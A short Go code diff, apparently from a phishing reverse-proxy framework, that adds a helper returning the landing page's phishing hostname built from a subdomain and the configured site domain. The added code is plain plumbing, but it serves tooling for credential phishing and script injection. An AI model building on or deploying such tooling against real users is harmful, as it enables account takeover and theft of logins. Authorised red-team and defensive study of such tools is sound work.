@@ -795,6 +795,18 @@ func (p *Phishlet) GetLoginUrl() string {
 	return "https://" + p.login.domain + p.login.path
 }
 
+func (p *Phishlet) GetLandingPhishHost() string {
+	for _, ph := range p.proxyHosts {
+		if ph.is_landing {
+			phishDomain, ok := p.cfg.GetSiteDomain(p.Name)
+			if ok {
+				return combineHost(ph.phish_subdomain, phishDomain)
+			}
+		}
+	}
+	return ""
+}
+
 func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, string, error) {
 	for _, js := range p.js_inject {
 		host_matched := false
